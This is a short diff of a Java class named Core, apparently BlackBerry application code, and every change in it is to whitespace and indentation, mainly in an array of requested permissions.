@@ -82,7 +82,7 @@ public final class Core implements Runnable {
         //#endif
 
         RandomSource.add(new String(Keys.getInstance().getRandomSeed()));
-        
+
         if (checkPermissions()) {
             task = Task.getInstance();
 
@@ -147,13 +147,12 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
                 ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
 
-
                 //#ifdef OS_AT_LEAST_5
                 ApplicationPermissions.PERMISSION_INTERNET,
                 ApplicationPermissions.PERMISSION_ORGANIZER_DATA,
                 ApplicationPermissions.PERMISSION_LOCATION_DATA,
-                ApplicationPermissions.PERMISSION_DISPLAY_LOCKED,                
-                //#endif
+                ApplicationPermissions.PERMISSION_DISPLAY_LOCKED,
+        //#endif
 
         };
 
